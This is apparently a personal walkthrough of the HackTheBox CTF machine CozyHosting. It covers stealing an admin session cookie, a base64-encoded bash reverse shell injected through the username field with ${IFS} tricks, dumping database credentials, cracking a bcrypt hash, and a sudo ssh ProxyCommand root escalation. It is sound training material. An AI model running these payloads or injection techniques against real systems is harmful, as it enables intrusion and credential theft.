---
title: "CozyHosting HackTheBox machine walkthrough"
excerpt_separator: "<!--more-->"
date: 2023-09-04 23:58:00 +0000
categories:
  - HackTheBox Writeups
tags:
  - Hacking
  - Notes
  - writeup
  - ctf
---


### Cosyhosting — HackTheBox Walkthrough

- *My writeups are more of my own mind-map than an "official" walkthrough, it may not seem straightforward sometimes but that's just the beauty of my own thinking.*

---

### Target Surface:

    - Spring Boot web app, discovered via /error and framework paths
    - Admin session discovered in /actuator/sessions cookie data
    - OS command injection in SSH connectivity form parameter
    - PostgreSQL backend with credentials in [application.properties](http://application.properties)
    - SSH access with cracked bcrypt hash for user escalation

### Tooling:

    - /etc/hosts mapping and whatweb recognition
    - gobuster with common and spring-boot wordlists
    - nmap for services discorvery
    - Burp Suite and ffuf for auth and parameter fuzzing
    - netcat for reverse shell listener
    - psql for database access
    - john for crypt hash cracking
  
---

# Foothold :

In this section, i’ll explain which approach I've taken to start hacking the box:

- The first thing to do before loading the webpage is to add the ip address to /etc/hosts to map the DNS to the machine cozyhosting.htb.
- Next i went through all the options and buttons available to see if there’s anything interesting but it wasn’t a complicated webapp since everything takes you back to the main index page.
- Here i started the basic enumeration i know since i couldn’t find anything on the source page excluding the js files of course, to enumerate i worked with a tool called [Gobuster](https://github.com/OJ/gobuster) which is a tool to brute-force URIs (directories and files) in web sites (in my case) for that i used the common.txt wordlist from the infamous **SecLists**, as below:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://cozyhosting.htb/
```

- On the side i went to see if there’s any open ports using Nmap with the command:

```bash
nmap -sC -sV 10.10.11.230
```

- Interestingly enough, after the directory enumeration there was a page called /error and for the services, ssh was open so it was obvious that later on we would need to gain remote access.
- Back to the /error page, after checking there was an error which I was unfamiliar with called "the white label error" after searching for it I could see it’s a spring boot framework related, we’ll get back to this.
- Before searching further into that i tried to bruteforce the login page using **ffuf** and **burpsuite** but nothing worked, i was lost then i tried to look for a spring boot vulnerability and its exploit, there was an **RCE** but the thing is i didn’t know how and where to put it, i knew it needed a **POST** action but also a vulnerable parameter and there wasn’t any- yes you may ask why not on the login form but that also didn’t work.
- That was the first break wall i encountered, i had to search for clues. I found that the vulnerability was indeed in spring boot but not like i imagined it. It needed a simple enumeration with **Gobuster** using spring-boot worldlist  😐:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u https://cozyhosting.htb/
```

- there was bunch of pages but the interesting one was “http://cozyhosting.htb/actuator/sessions” which contained a bunch of cookies- yes cookies and one of them was the admin called kanderson TADA!!!
- After changing my cookie to his, I was in the admin panel.
- There wasn’t much to look at it was a simple webpage with hosts monitoring kinda thing and before the footer there was an ssh connection to a host using hostname and username.
- Now tbh i didn’t know what to do i mean i knew it was vulnerable with the error output it displayed and i knew it was an OS command injection but i didn’t know how to exploit it, after searching (again) i knew the username was exploitable so using this payload i was in, steps are below:
1. Encode the payload using **base64**:

```bash
/bin/bash -i >& /dev/tcp/<MY_IP>/<MY_PORT> 0>&1 => L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjY0LzEzMzcgMD4mMQ==
```

1. construct the payload cause the field doesn’t accept space:

```bash
;$(echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjY0LzEzMzcgMD4mMQ==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS})
```

1. start a listener on my attack machine using **netcat**:

```bash
nc -lvnp 1337
```

1. Paste the payload on the username field and boom we got access which leads us to the next section, User flag.

# User flag:

Ouf i was close to tripping there, anyway now that i’m in with a user called app i started looking around:

- Before looking any further I needed to stabilize the the shell and apparently it was crucial later on the steps, to do that the **pty** alone didn’t work so I had to do this:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL^Z
stty size;stty raw -echo;fg
reset
```

- Now that we have a stable shell, the first thing i did and everyone does is list the directory using **ls** then **ls -a** in which I found a file called cloudhosting-0.0.1.jar.
- After trying to unzip it, it didn’t work, so i had to start a server on the victim machine so i could download it remotely on my attack machine as below:

 

```bash
#On the victim machine and inside the file directory
python3 -m http.server 8081
#On the attack machine
https://<victim-ip>:8081/cloudhosting-0.0.1.jar
```

- It contained many files so I wasn't sure which way I should focus on so I needed another clue, i checked the running processes using **ps aux** and there It was, **PostgreSQL** process running so it must be it.
- also i randomly checked the /etc/passwd file (cause i could) there was a postgres user there so i kept thar in mind.
- Obviously after that i went to check the previous files that i downloaded for **postgresql** stuff, after thoroughly checking there was an interesting file called [application.properties](http://application.properties) in /BOOT-INF/classes, cat that and boom you got the postgresql username and password.
- To connect with that I used the command below:

```bash
psql -h localhost -d cozyhosting -U postgres
```

- Enter the password **Vg&nvzAQ7XxR** and we’re in the database.
- After listing tables with **/dt** i found the users and hosts tables so i listed the users using:

```sql
SELECT * FROM users;
```

- There were two users admin(josh) and kanderson and their hashed passwords.
- I took the josh one and cracked it with **john** tool using the worldlist rockyou.txt:

```bash
john hash-mode 3200 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

- The password of josh is manchesterunited.
- So we know what to do after that:

```bash
ssh josh@victim-ip 
```

- Again, **ls** and boom user.txt which contains the flag.

# root flag:

This one was way faster and it was easy.

- My insticts went to /tmp file where i found the linpeas file i was like bingo!

<aside>
💡 linpeas is a script made for making privilege escalation easier by making the potentially vulnerable parameters stand out during a full scan

</aside>

- Honestly there was no need for that cause this was an easy machine, but it showed directories that were interesting enough to exploit:

```bash
/usr/bin/base64
/usr/bin/curl
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
```

- I went to **gtfobins** and looked for the base64 exploit first but it didn’t work.
- Then i went directly to **sudo** i mean come on it was obvious 😏 and boom i found the privesc exploit for that which is:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

- Aaaaaand we’re root! 🎉
- i did **cd ~** then **ls** where i found the root.txt file which also contains the flag.



That's it! Ps This box was the first machine I rooted on HackTheBox.